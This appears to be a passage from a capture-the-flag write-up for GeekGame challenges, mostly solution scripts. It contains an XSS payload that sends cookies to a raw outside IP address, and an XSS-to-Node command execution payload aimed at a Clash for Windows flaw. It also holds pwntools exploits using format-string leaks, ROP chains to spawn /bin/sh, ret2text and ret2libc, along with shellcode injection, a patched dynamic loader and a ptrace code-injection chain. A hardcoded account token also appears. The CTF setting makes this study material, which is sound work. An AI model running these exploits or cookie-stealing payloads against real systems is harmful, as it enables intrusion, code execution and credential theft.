<script>function getflag(){var a = document.getElementById("xss").contentWindow.document.cookie;window.open("http://49.232.202.102:9999/?flag="+a);}</script>
```

## prob02-greatwall

- https://github.com/Fndroid/clash_for_windows_pkg/issues/3891

### flag1

```python
script = b'''<script>
const { spawn } = require("child_process");
const cat = spawn("cat", ["/app/profiles/flag.yml"]);
cat.stdout.on("data", data => {
    alert(`stdout: ${data}`);
});</script>'''
payload = 'http://127.0.0.1:9090/1.txt&name=a<img/src="1"/onerror=\'writeln(String.fromCharCode('
for i in script:
    payload += str(i) + ','
payload = payload[:-1]
payload += '))\'>'

print(payload)
```

### flag3

```python
script = b'''<script>
const { spawn } = require("child_process");
const cat = spawn("/app/readflag");
cat.stdout.on("data", data => {
    alert(`stdout: ${data}`);
});</script>'''
payload = 'http://127.0.0.1:9090/1.txt&name=a<img/src="1"/onerror=\'writeln(String.fromCharCode('
for i in script:
    payload += str(i) + ','
payload = payload[:-1]
payload += '))\'>'

print(payload)
```

## prob25-krkr

### flag1

GARbro.GUI解data.xp3

### flag2

解包设置存档不加密，拿到AEIOU}个数，prev_hash，dfs

```python
remain = {'A': 6, 'I': 1, 'E': 3, 'O': 6}
flag = ''
fmap = []
m = 19260817

def box(c):
    if c == 'A':
        return 11
    elif c == 'E':
        return 22
    elif c == 'I':
        return 33
    elif c == 'O':
        return 44
        
def dfs(d, value, flag):
    if d < 16:
        for i in remain:
            if remain[i] > 0:
                remain[i] -= 1
                dfs(d + 1, (value * 13337 + box(i)) % m, flag + i)
                remain[i] += 1
    else:
        if (value * 13337 + 66) % m == 7748521:
            print(flag)
        # fmap.append((value, flag, remain))

dfs(0, 1337, '')
print(fmap)
```

## prob09-easyc

### flag1

```python
#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

arg = lambda x, y: args[y] if args[y] else x
FILE = arg('./pwn', 'FILE')
IP = arg('prob09.geekgame.pku.edu.cn', 'IP')
PORT = arg(10009, 'PORT')
LIBC = arg('/lib/x86_64-linux-gnu/libc.so.6', 'LIBC')
RLIBC = arg(LIBC, 'RLIBC')

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive() if p.connected() else p.close()
dbg = lambda cmd='': gdb.attach(p, cmd)and pause(2)if args['DBG']else False
uu64 = lambda x: u64(x.ljust(8, b'\0'))
leak = lambda value, info=b'': success('%s ==> 0x%x'%(info, value))
one_gadget = lambda filename=LIBC: list(map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split()))
def run(ip=IP, port=PORT):global p;p=remote(ip,port)if args['REMOTE'] else process(FILE)
def loadlibc(filename=RLIBC if args['REMOTE'] else LIBC):global libc;libc=ELF(filename,checksec=False)
def str2int(s, info = '',offset = 0):s=p.recv(s)if type(s)==int else s;ret=uu64(s)-offset;leak(ret,info);return ret

context(os='linux', arch='amd64')
context.terminal = 'wt.exe -w pwn nt bash -c'.split()
context.log_level = 'DEBUG'

def chose(idx):
    sla(b'Chose', str(idx).encode())
def add(idx, size, content=b'\n'):
    chose(1)
    sla(b'Index', str(idx).encode())
    sla(b'Size', str(size).encode())
    sa(b'Content', content)
def free(idx):
    chose(2)
    sla(b'Index', str(idx).encode())
def edit(idx, content):
    chose(3)
    sla(b'Index', str(idx).encode())
    sa(b'Content', content)
def show(idx):
    chose(4)
    sla(b'Index', str(idx).encode())
def login():
    sla(b'Please input your token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')

run()
login()
dbg('b *$rebase(0xA345)')
flag = b''
for i in range(8):
    p.recvuntil(b':\n')
    p.sendline(f'%{i+0x1a}$p'.encode())
    res = p.recvline()
    if b'nil' in res:
        continue
    flag += p64(int(res, 16))
print(flag)
ia()
```

### flag2

fmt+ret2syscall

```python
#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

arg = lambda x, y: args[y] if args[y] else x
FILE = arg('./pwn', 'FILE')
IP = arg('prob09.geekgame.pku.edu.cn', 'IP')
PORT = arg(10009, 'PORT')
LIBC = arg('/lib/x86_64-linux-gnu/libc.so.6', 'LIBC')
RLIBC = arg(LIBC, 'RLIBC')

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive() if p.connected() else p.close()
dbg = lambda cmd='': gdb.attach(p, cmd)and pause(2)if args['DBG']else False
uu64 = lambda x: u64(x.ljust(8, b'\0'))
leak = lambda value, info=b'': success('%s ==> 0x%x'%(info, value))
one_gadget = lambda filename=LIBC: list(map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split()))
def run(ip=IP, port=PORT):global p;p=remote(ip,port)if args['REMOTE'] else process(FILE)
def loadlibc(filename=RLIBC if args['REMOTE'] else LIBC):global libc;libc=ELF(filename,checksec=False)
def str2int(s, info = '',offset = 0):s=p.recv(s)if type(s)==int else s;ret=uu64(s)-offset;leak(ret,info);return ret

context(os='linux', arch='amd64')
context.terminal = 'wt.exe -w pwn nt bash -c'.split()
context.log_level = 'DEBUG'

def chose(idx):
    sla(b'Chose', str(idx).encode())
def add(idx, size, content=b'\n'):
    chose(1)
    sla(b'Index', str(idx).encode())
    sla(b'Size', str(size).encode())
    sa(b'Content', content)
def free(idx):
    chose(2)
    sla(b'Index', str(idx).encode())
def edit(idx, content):
    chose(3)
    sla(b'Index', str(idx).encode())
    sa(b'Content', content)
def show(idx):
    chose(4)
    sla(b'Index', str(idx).encode())
def login():
    if args['REMOTE']:
        sla(b'Please input your token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')

run()
login()
dbg('b *$rebase(0xA345)')
off = (0x7fffffffdaf8 - 0x7fffffffd600) // 8 + 6
p.recvuntil(b':\n')
p.sendline(f'%{off}$p'.encode())
base = int(p.recvline(), 16) - 0x7ffff7f393fd + 0x7ffff7f2f000
leak(base, 'base')

off = (0x7fffffffdaf0 - 0x7fffffffd600) // 8 + 6
p.recvuntil(b':\n')
p.sendline(f'%{off}$p'.encode())
stack = int(p.recvline(), 16) - 0x7fffffffdb00 + 0x7fffffffdb28
p5r_stack = stack - 0x30
binsh = stack - 0x7fffffffdb28 + 0x7fffffffd6e8

rax = base + 0x000000000005a777 #  pop rax; ret;
rdi = base + 0x0000000000009cd2 #  pop rdi; ret;
rsi = base + 0x000000000001781e #  pop rsi; ret;
rdx = base + 0x0000000000009bdf #  pop rdx; ret;
syscall = base + 0x00000000000269b4 #  syscall; ret;
p5r = base + 0x000000000000bb14

payload_off = 0x22

payload = [
rdi,
binsh,
rsi,
0,
rdx,
0,
rax,
59,
syscall
]

fpayload = fmtstr_payload(payload_off, {p5r_stack: p5r})
p.recvuntil(b':\n')
p.sendline(fpayload)

for i, j in enumerate(payload):
    fmap = {}
    fmap.update({stack+i*8: j})
    # print(fmap)
    fpayload = fmtstr_payload(payload_off, fmap)

    p.recvuntil(b':\n')
    p.sendline(fpayload)

# dbg('b *$rebase(0xA390)')
p.recvuntil(b':\n')
p.sendline(b'exit'.ljust(8, b'\0') + b'/bin/sh\0')

# flag = b''
# for i in range(8):
#     p.recvuntil(b':\n')
#     p.sendline(f'%{i+0x1a}$p'.encode())
#     res = p.recvline()
#     if b'nil' in res:
#         continue
#     flag += p64(int(res, 16))
# print(flag)
ia()
```

## prob10-babystack

### flag1

ret2text

```python
#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

arg = lambda x, y: args[y] if args[y] else x
FILE = arg('./challenge1', 'FILE')
IP = arg('prob10.geekgame.pku.edu.cn', 'IP')
PORT = arg(10010, 'PORT')
LIBC = arg('/lib/x86_64-linux-gnu/libc.so.6', 'LIBC')
RLIBC = arg(LIBC, 'RLIBC')

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive() if p.connected() else p.close()
dbg = lambda cmd='': gdb.attach(p, cmd)and pause(2)if args['DBG']else False
uu64 = lambda x: u64(x.ljust(8, b'\0'))
leak = lambda value, info=b'': success('%s ==> 0x%x'%(info, value))
one_gadget = lambda filename=LIBC: list(map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split()))
def run(ip=IP, port=PORT):global p;p=remote(ip,port)if args['REMOTE'] else process(FILE)
def loadlibc(filename=RLIBC if args['REMOTE'] else LIBC):global libc;libc=ELF(filename,checksec=False)
def str2int(s, info = '',offset = 0):s=p.recv(s)if type(s)==int else s;ret=uu64(s)-offset;leak(ret,info);return ret

context(os='linux', arch='amd64')
context.terminal = 'wt.exe -w pwn nt bash -c'.split()
context.log_level = 'DEBUG'

def chose(idx):
    sla(b'Chose', str(idx).encode())
def add(idx, size, content=b'\n'):
    chose(1)
    sla(b'Index', str(idx).encode())
    sla(b'Size', str(size).encode())
    sa(b'Content', content)
def free(idx):
    chose(2)
    sla(b'Index', str(idx).encode())
def edit(idx, content):
    chose(3)
    sla(b'Index', str(idx).encode())
    sa(b'Content', content)
def show(idx):
    chose(4)
    sla(b'Index', str(idx).encode())
def login():
    sla(b'Please input your token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')

run()
login()
p.sendline(b'0')
payload = b'a'*0x78 + p64(0x4011BE)
dbg()
p.sendline(payload)
ia()
```

### flag2

ret2libc

```python
#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

arg = lambda x, y: args[y] if args[y] else x
FILE = arg('./challenge2', 'FILE')
IP = arg('prob10.geekgame.pku.edu.cn', 'IP')
PORT = arg(10011, 'PORT')
LIBC = arg('/lib/x86_64-linux-gnu/libc.so.6', 'LIBC')
RLIBC = arg(LIBC, 'RLIBC')

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive() if p.connected() else p.close()
dbg = lambda cmd='': gdb.attach(p, cmd)and pause(2)if args['DBG']else False
uu64 = lambda x: u64(x.ljust(8, b'\0'))
leak = lambda value, info=b'': success('%s ==> 0x%x'%(info, value))
one_gadget = lambda filename=LIBC: list(map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split()))
def run(ip=IP, port=PORT):global p;p=remote(ip,port)if args['REMOTE'] else process(FILE)
def loadlibc(filename=RLIBC if args['REMOTE'] else LIBC):global libc;libc=ELF(filename,checksec=False)
def str2int(s, info = '',offset = 0):s=p.recv(s)if type(s)==int else s;ret=uu64(s)-offset;leak(ret,info);return ret

context(os='linux', arch='amd64')
context.terminal = 'wt.exe -w pwn nt bash -c'.split()
context.log_level = 'DEBUG'

def chose(idx):
    sla(b'Chose', str(idx).encode())
def add(idx, size, content=b'\n'):
    chose(1)
    sla(b'Index', str(idx).encode())
    sla(b'Size', str(size).encode())
    sa(b'Content', content)
def free(idx):
    chose(2)
    sla(b'Index', str(idx).encode())
def edit(idx, content):
    chose(3)
    sla(b'Index', str(idx).encode())
    sa(b'Content', content)
def show(idx):
    chose(4)
    sla(b'Index', str(idx).encode())
def login():
    sla(b'Please input your token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')

run()
# login()
dbg('b *0x40127E')
sla(b's)\n', b'%21$p\0')
p.recvuntil(b'flag: ')
loadlibc()
libc.address = int(p.recvline(), 16) - 0x29d90
leak(libc.address, 'libc')
rax = libc.address + 0x0000000000045eb0 #  pop rax; ret;
rdi = libc.address + 0x000000000002a3e5 #  pop rdi; ret;
rsi = libc.address + 0x000000000002be51 #  pop rsi; ret;
rdx = libc.address + 0x000000000011f497 #  pop rdx; pop r12; ret;
rdx = libc.address + 0x0000000000108b13 #  pop rdx; pop rcx; pop rbx; ret;
syscall = libc.address + 0x0000000000091396 #  syscall; ret;
binsh = libc.address + 0x1d8698 # /bin/sh
payload = b'a'*0x78 + flat(
rdi+1,
rdi,
binsh,
libc.sym['system']
)
print(hex(libc.sym['system']-libc.address))
p.sendline(payload)
ia()
```

## prob20-polynomial

### flag1

矩阵加减

```python
import numpy as np
from Crypto.Util.number import *

n = 998244353

m = []
for j in range(36):
    line = []
    for i in range(36):
        line.append(pow(j + 1, i, n))
    m.append(line)

ebox = [3318,
  382207753,
  141261786,
  100396702,
  617742273,
  385313506,
  368063237,
  562832377,
  857094849,
  53657966,
  669496487,
  605913203,
  29815074,
  762568211,
  133958153,
  223410103,
  39956957,
  937802638,
  229055941,
  767816204,
  13414714,
  795034084,
  184947163,
  171452954,
  272370098,
  484621960,
  430570773,
  639750081,
  695262892,
  144991146,
  292318513,
  573477240,
  867813853,
  798543925,
  12064634,
  874910184]

def minu(line1, line2, x):
    for i in range(36):
        m[line1][i] = (m[line1][i] - m[line2][i] * x) % n
    ebox[line1] = (ebox[line1] - ebox[line2] * x) % n

def be1(line):
    x = inverse(m[line][line], n)
    for i in range(36):
        m[line][i] = (m[line][i] * x) % n
    ebox[line] = (ebox[line] * x) % n

for i in range(36):
    be1(i)
    for j in range(i + 1, 36):
        minu(j, i, m[j][i])

for i in range(35, -1, -1):
    for j in range(i - 1, -1, -1):
        minu(j, i, m[j][i])

print(m)
for i in ebox:
    print(chr(i), end='')
```

### flag2

逆操作

```python
from value import ebox, key
from Crypto.Util.number import *

n = 0x40
m = 998244353

flag = ebox

k = 1
while k < 0x40:
    for i in range(n - 2 * k, -1, -2 * k):
        for j in range(k - 1, -1, -1):
            v5 = key[j + k]
            tmp1 = flag[i + j]
            tmp2 = flag[i + j + k]
            tmp3 = (tmp2 * inverse(v5, m)) % m
            v6 = ((tmp1 + tmp3) * inverse(2, m)) % m
            v7 = ((tmp1 - tmp3) * inverse(2, m)) % m
            # print(i, j, k)
            # print(i, j, k)

            flag[i + j] = v6
            flag[i + j + k] = v7
    print(flag)
    k *= 2

# print(flag)
for i in flag:
    print(chr(i), end='')
```

### flag3

求系数

```python
from lib import *
from value import box
from Crypto.Util.number import *

n = 0x40
m = 998244353

def mul(line, v):
    valuebox[line] = (valuebox[line] * v) % m
    for i, j in enumerate(maxibox[line]):
        maxibox[line][i] = (j * v) % m
def add(line1, line2):
    valuebox[line1] = (valuebox[line1] + valuebox[line2]) % m
    for i, j in enumerate(maxibox[line1]):
        maxibox[line1][i] = (j + maxibox[line2][i]) % m
def min(line1, line2):
    valuebox[line1] = (valuebox[line1] - valuebox[line2]) % m
    for i, j in enumerate(maxibox[line1]):
        maxibox[line1][i] = (j - maxibox[line2][i]) % m
def mulline(aline, v):
    for i, j in enumerate(aline):
        aline[i] = (j * v) % m
def addline(aline1, aline2):
    for i, j in enumerate(aline1):
        aline1[i] = (j + aline2[i]) % m
def minline(aline1, aline2):
    for i, j in enumerate(aline1):
        aline1[i] = (j - aline2[i]) % m
def menc(flag, n):
    k = n
    while k > 1:
        k //= 2
        for i in range(0, n, 2 * k):
            for j in range(0, k):
                # print(i, j, k)
                v5 = key[j + k]
                v6 = flag[i + j]
                m6 = maxibox[i + j].copy()
                # print(flag)
                # print(len(flag))
                v7 = flag[j + i + k]
                m7 = maxibox[j + i + k].copy()
                m61 = m6.copy()
                flag[i + j] = (v6 + v7) % m
                addline(m6, m7)
                flag[i + j + k] = ((v6 - v7) * v5) % m
                minline(m61, m7)
                mulline(m61, v5)
                maxibox[i + j] = m6
                maxibox[i + j + k] = m61
def menc3(flag, n):
    i = 1
    while n >= 2 * i:
        # print('\n\n#############')
        # info(flag)
        for j in range(0, n, 2 * i):
            for k in range(0, i):
                # print(i, j, k)
                # print(j+k, i+j+k)
                v5 = key[k + i]
                v6 = flag[j + k]
                m6 = maxibox[j + k].copy()
                v7 = (flag[j + k + i] * v5) % m
                m7 = maxibox[j + k + i].copy()
                mulline(m7, v5)
                flag[j + k] = (v6 + v7) % m
                m61 = m6.copy()
                addline(m6, m7)
                maxibox[j + k] = m6
                flag[i + j + k] = (v6 - v7) % m
                minline(m61, m7)
                maxibox[i + j + k] = m61
        i *= 2
    # return
    v7 = 0x3b090001
    
    v3 = 1
    i = n - 1
    while i > v3:
        tmp = flag[v3]
        flag[v3] = flag[i]
        flag[i] = tmp
        m3 = maxibox[v3].copy()
        mi = maxibox[i].copy()
        maxibox[v3] = mi
        maxibox[i] = m3
        v3 += 1
        i -= 1
    # return
    for mm in range(n):
        flag[mm] = (flag[mm] * v7) % m
        mmm = maxibox[mm].copy()
        mulline(mmm, v7)
        maxibox[mm] = mmm

if __name__ == '__main__':
    maxibox = []
    for i in range(0x80):
        maxibox.append([0]*0x80)
    for i in range(0x80):
        maxibox[i][i] = 1
    valuebox = [1] * 0x80
    flag = [0x61] * 40
    flag += [0] * (0x80 - 40)
    menc(flag, 2 * n)
    tbox = [0] * 0x80
    for i in range(0x40):
        tbox[i] = box[i % 34]
    enc(tbox, 2 * n)
    for i in range(0x80):
        v1 = maxibox[i]
        mulline(v1, tbox[i])
        maxibox[i] = v1
    for i in range(0x80):
        flag[i] = (flag[i] * tbox[i]) % m
    from test import enc3
    menc3(flag, 2 * n)
    # print(flag)
    print('m = ', end='')
    print(maxibox)
```

矩阵加减

```python
import numpy as np
from Crypto.Util.number import *
from value import *
from m import m

NUMLINE = 40
n = 998244353
ebox += [0] * (NUMLINE - len(ebox))

def minu(line1, line2, x):
    for i in range(NUMLINE):
        m[line1][i] = (m[line1][i] - m[line2][i] * x) % n
    ebox[line1] = (ebox[line1] - ebox[line2] * x) % n

def be1(line):
    x = inverse(m[line][line], n)
    for i in range(NUMLINE):
        m[line][i] = (m[line][i] * x) % n
    ebox[line] = (ebox[line] * x) % n

for i in range(NUMLINE):
    be1(i)
    for j in range(i + 1, NUMLINE):
        minu(j, i, m[j][i])

for i in range(NUMLINE - 1, -1, -1):
    for j in range(i - 1, -1, -1):
        minu(j, i, m[j][i])

print(m)
print(ebox)
for i in ebox:
    print(chr(i), end='')
```

## prob07-noexec

### flag1

lldb attach

```python
from pwn import *

context.arch = 'amd64'

shell = '''
mov rax, 548
xor rdi, rdi
mov rsi, rsp
syscall

mov rax, 1
mov rdi, rax
mov rsi, rsp
mov rdx, 32
syscall
'''

# e = make_elf_from_assembly(shell)
shellcode = asm(shell).ljust(40, b'\0')
print(shellcode)
print(len(shellcode))
addr = 5037475
for i in range(0, len(shellcode), 8):
    v = u64(shellcode[i:i + 8])
    print(f'memory write -s 8 {hex(addr+i)} {hex(v)}')
```

### flag2

IDA找某报错点，dd注入mem

```bash
dd if=/tmp/exp of=mem bs=1 seek=$((0x4566BA)) count=$((400)) conv=notrunc
```

### flag3

步骤1：patch

篡改ld.so.6的段加载部分

```python
from pwn import *

FILE = './ld.so.6.bak'

context.update(os='linux', arch='amd64')
e = ELF(FILE, checksec=False)

def patch(target, shell, end=0):
    if deta := target & 0x3:
        target -= deta
    shellcode = asm('nop\n'*deta+shell, vma=target)
    if end < 0:
        end = target - end
    if end and end - target != len(shellcode):
        print(f'length: {len(shellcode)}\nshellcode: {enhex(shellcode)}')
        exit(-1)
    e.write(target+deta, shellcode[deta:])

load_eh_frame = 0x200
e.write(load_eh_frame, p32(0x1))
e.write(load_eh_frame+4, p32(0x7))

patch(ehframe:=e.get_section_by_name('.eh_frame_hdr').header.sh_addr,
f'''
push r9
push r8
push rcx
push rdx
push rsi
push rdi

mov rdi, qword ptr [rsp + 0x20]
mov rsi, qword ptr [rsp + 0x28]
mov rdx, 0
mov rax, SYS_lseek
syscall

lea rdi, busybox[rip]
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
push rax

mov rsi, qword ptr [rsp + 0x10]
mov qword ptr remain[rip], rsi
mov rdi, qword ptr [rsp + 0x8]
init_mmap:
mov rsi, qword ptr remain[rip]
cmp rsi, 0
je end_mmap
cmp rsi, 0xd0000
jl begin_less
sub rsi, 0xd0000
mov qword ptr remain[rip], rsi
mov rsi, 0xd0000
jmp begin_mmap
begin_less:
mov qword ptr remain[rip], 0
begin_mmap:
mov rdx, 7
mov r10, qword ptr [rsp + 0x20]
mov r8, qword ptr [rsp]
mov r9, 0
mov rax, SYS_mmap
syscall
add rdi, rsi
jmp init_mmap

end_mmap:
mov rsi, qword ptr [rsp + 0x8]
mov rdx, qword ptr [rsp + 0x10]
mov qword ptr read_times[rip], 0
re_read:
add qword ptr read_times[rip], 1
mov rdi, qword ptr [rsp + 0x28]
mov rax, SYS_read
syscall
cmp rax, rdx
jge re_read_next
sub rdx, rax
add rsi, rax
push rsi
push rdx
mov rdi, qword ptr [rsp + 0x38]
mov rsi, qword ptr 0
mov rdx, 0
mov rax, SYS_lseek
syscall
pop rdx
pop rsi
cmp qword ptr read_times[rip], 10
jg re_read_next
jmp re_read

re_read_next:
mov rdi, qword ptr [rsp + 0x8]
mov rsi, qword ptr [rsp + 0x10]
mov rdx, qword ptr [rsp + 0x18]
mov rax, SYS_mprotect
syscall

mov rdi, qword ptr [rsp]
mov rax, SYS_close
syscall

add qword ptr first[rip], 1
cmp qword ptr first[rip], 4
jne end
mov rdi, qword ptr [rsp + 0x28]
mov rsi, 0x340
mov rdx, 0
mov rax, SYS_lseek
syscall

end:
mov rax, qword ptr [rsp + 0x8]
add rsp, 0x38
ret

busybox:
.string "/bin/busybox"
libc:
.string "./libc.so.6"
libgcc:
.string "./libgcc_s.so.1"
digit:
.int 0
.int 0
first:
.int 0
.int 0
read_times:
.int 0
.int 0
remain:
.int 0
.int 0
''')

# patch(ehframe:=e.get_section_by_name('.eh_frame_hdr').header.sh_addr,
# f'''
# jmp {0x21490}
# ''')

patch(0x7136,
f'''
call {ehframe}
''',
0x713B)
print(hex(ehframe))

e.save('ld.so.6')
```

步骤2：初始化

1. 远程获取maps，填充`orimunmap.maps`

   ```
   00400000-00512000 r-xp 00000000 00:02 6                                  /bin/busybox
   00711000-00714000 rw-p 00111000 00:02 6                                  /bin/busybox
   00714000-00715000 ---p 00000000 00:00 0                                  [heap]
   00715000-00716000 rw-p 00000000 00:00 0                                  [heap]
   7f357a42a000-7f357a42b000 rw-p 00000000 00:00 0
   7f357a42f000-7f357a432000 rw-p 00000000 00:00 0
   7ffe97845000-7ffe97866000 rw-p 00000000 00:00 0                          [stack]
   7ffe979de000-7ffe979e2000 r--p 00000000 00:00 0                          [vvar]
   7ffe979e2000-7ffe979e4000 r-xp 00000000 00:00 0                          [vdso]
   ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
   ```

2. 运行`trans_ori_maps_to_maps.py`得到`munmap.maps`

   ```
   0x400000 0 r-xp 0x112000
   0x711000 0 rw-p 0x3000
   0x714000 0 ---p 0x1000
   0x715000 0 rw-p 0x1000
   0x7f0a83453000 0 rw-p 0x1000
   0x7f0a83458000 0 rw-p 0x3000
   0x7ffe63360000 0 rw-p 0x21000
   0x7ffe633a3000 0 r--p 0x4000
   0xffffffffff600000 0 --xp 0x1000
   ```

3. 窗口1，运行本地文件，断在start

   ```
   python -i get_core_value.py
   ```

   ```python
   from pwn import *
   
   context.terminal = 'wt.exe -w pwn nt bash -c'.split()
   
   p = gdb.debug(['./ld.so.6', '--library-path', '/tmp', '/tmp/hard_flag'], env={'RUST_BACKTRACE':'full'})
   ```

4. 准备dump内存

   ```
   vmmap内存到a.maps
   i r到register.maps
   ```

5. 窗口2

   ```
   python dump.py > d.py
   复制到窗口1，得到core
   ```

   ```python
   def maps_file_to_maps(file):
       with open(file, "r") as f:
           maps = f.read()
   
       maps = maps.replace("\n", " ").split(" ")
       tmp = []
       for i in maps:
           if i != '':
               tmp.append(i)
       maps = tmp
   
       result = []
       for i in range(0, len(maps), 4):
           addr = int(maps[i], 16)
           tmp = maps[i+2]
           rwx = 0
           if tmp[0] == 'r':
               rwx += 4
           if tmp[1] == 'w':
               rwx += 2
           if tmp[2] == 'x':
               rwx += 1
           length = int(maps[i+3], 16)
           result.append((addr, rwx, length))
       return result
   
   mmap_list = maps_file_to_maps("./a.maps")
   print(f'with open("../core", "wb") as f:')
   print(f' while True:')
   for i in mmap_list:
       print(f'  print("{hex(i[0])}")')
       print(f'  a = p.readmem({hex(i[0])}, {hex(i[2])})')
       print(f'  if len(a) != {hex(i[2])}:')
       print(f'   print("error")')
       print(f'   break')
       print(f'  f.write(a)')
   print(f'  break')
   ```

步骤3：生成exp

1. 运行`inject0.py`，得到`inject0`

   ```python
   from pwn import *
   
   context.arch = 'amd64'
   
   shell = '''
   mov rdi, 0x20000
   mov rsi, 0x10000
   mov rdx, 7
   mov r10, 0x22
   mov r8, -1
   xor r9, r9
   mov rax, SYS_mmap
   syscall
   
   lea rdi, qword ptr inject[rip]
   xor rsi, rsi
   xor rdx, rdx
   mov rax, SYS_open
   syscall
   
   mov rdi, rax
   mov rsi, 0x20000
   mov rdx, 1000
   mov rax, SYS_read
   syscall
   mov rdi, 0x20000
   jmp rdi
   inject:
   .string "/tmp/inject"
   '''
   
   shellcode = asm(shell)
   
   with open('../../inject0', 'wb') as f:
       f.write(shellcode)
   ```

2. 运行`inject.py`，获得`inject`

   ```python
   from pwn import *
   
   context.arch = 'amd64'
   
   shell = '''
   mov rdi, 1
   lea rsi, entryout[rip]
   mov rdx, 12
   mov rax, SYS_write
   syscall
   jmp my_start
   entryout:
   .string "entry inject"
   
   my_start:
   mov rax, SYS_fork
   syscall
   cmp rax, 0
   jnz father
   
   xor rdi, rdi
   xor rsi, rsi
   xor rdx, rdx
   xor r10, r10
   mov rax, SYS_ptrace
   syscall
   
   lea rdi, busybox[rip]
   xor rsi, rsi
   xor rdx, rdx
   mov rax, SYS_execve
   syscall
   busybox:
   .string "/bin/busybox"
   
   father:
   mov r13, rax
   mov rdi, 3
   mov rsi, r13
   mov rdx, 60
   xor r10, r10
   mov rax, SYS_ptrace
   syscall
   
   mov rdi, 0x10000
   mov rsi, 0x10000
   mov rdx, 7
   mov r10, 0x22
   mov r8, -1
   xor r9, r9
   mov rax, SYS_mmap
   syscall
   
   lea rdi, exp[rip]
   xor rsi, rsi
   xor rdx, rdx
   mov rax, SYS_open
   syscall
   
   mov rdi, rax
   mov rsi, 0x10000
   mov rdx, 1000
   mov rax, SYS_read
   syscall
   
   mov rdi, -1
   xor rsi, rsi
   xor rdx, rdx
   xor r10, r10
   mov rax, SYS_wait4
   syscall
   
   mov rsp, 0x10800
   mov rdi, 12
   mov rsi, r13
   xor rdx, rdx
   mov r10, rsp
   mov rax, SYS_ptrace
   syscall
   
   mov rdi, 1
   mov rsi, rsp
   add rsi, 0x80
   mov rdx, 0x8
   mov rax, SYS_write
   syscall
   
   push rsp
   mov rbp, rsp
   sub rsp, 0x10
   mov qword ptr [rbp - 8], 0
   mov r8, 0x10000
   mov rdx, qword ptr [rsi]
   copy_loop:
   cmp qword ptr [rbp - 8], 184
   jge end_loop
   mov r10, qword ptr [r8]
   mov rdi, 5
   mov rsi, r13
   mov rax, SYS_ptrace
   syscall
   
   add qword ptr [rbp - 8], 8
   add r8, 8
   add rdx, 8
   jmp copy_loop
   
   end_loop:
   mov rdi, 7
   mov rsi, r13
   xor rdx, rdx
   xor r10, r10
   mov rax, SYS_ptrace
   syscall
   
   mov qword ptr [rsp], 10
   mov qword ptr [rsp + 8], 0
   mov rdi, rsp
   mov rsi, 0
   mov rax, SYS_nanosleep
   syscall
   exp:
   .string "/tmp/exp"
   '''
   
   context.arch = 'amd64'
   shellcode = asm(shell)
   with open('../../inject', 'wb') as f:
       f.write(shellcode)
   ```

3. 运行`init_step1.py`获得`exp`

   ```python
   from pwn import *
   
   context.arch = 'amd64'
   
   shell = '''
   mov rdi, 1
   lea rsi, entryout[rip]
   mov rdx, 18
   mov rax, SYS_write
   syscall
   jmp my_start
   entryout:
   .string "entry small trojan"
   
   my_start:
   
   mov rax, SYS_mmap
   mov rdi, 0x10000
   mov rsi, 0x10000
   mov rdx, 7
   mov r10, 0x22
   mov r8, -1
   mov r9, 0
   syscall
   
   mov rax, SYS_open
   lea rdi, name[rip]
   mov rsi, 0
   mov rdx, 0
   syscall
   
   mov rdi, rax
   mov rax, SYS_read
   mov rsi, 0x10000
   mov rdx, 0x10000
   syscall
   
   mov rax, 0x10000
   jmp rax
   
   name:
   .string "/tmp/exp1"
   '''
   
   shellcode = asm(shell)
   
   with open('exp', 'wb') as f:
       f.write(shellcode)
   ```

4. 运行`python deal.py > last.c`

   ```python
   ## step0
   print('#include <unistd.h>')
   print('#include <sys/syscall.h>')
   print('int main() {')
   
   ## step1
   
   def maps_file_to_maps(file):
       with open(file, "r") as f:
           maps = f.read()
   
       maps = maps.replace("\n", " ").split(" ")
       tmp = []
       for i in maps:
           if i != '':
               tmp.append(i)
       maps = tmp
   
       result = []
       for i in range(0, len(maps), 4):
           addr = int(maps[i], 16)
           tmp = maps[i+2]
           rwx = 0
           if tmp[0] == 'r':
               rwx += 4
           if tmp[1] == 'w':
               rwx += 2
           if tmp[2] == 'x':
               rwx += 1
           length = int(maps[i+3], 16)
           result.append((addr, rwx, length))
       return result
   munmap_list = maps_file_to_maps('unmap.maps')
   mmap_list = maps_file_to_maps("./a.maps")
   # print(result)
   
   ## step2 : dump
   
   def output_maps_to_code_munmap(maps):
       for i in maps:
           # print(f'    syscall(SYS_munmap, {hex(i[0])}, {hex(i[2])});')
           print(f'    "mov rdi, {hex(i[0])};"')
           print(f'    "mov rsi, {hex(i[2])};"')
           print(f'    "mov rax, 11;"')
           print(f'    "syscall;"')
   def output_maps_to_code_mmap(maps):
       for i in maps[:5]:
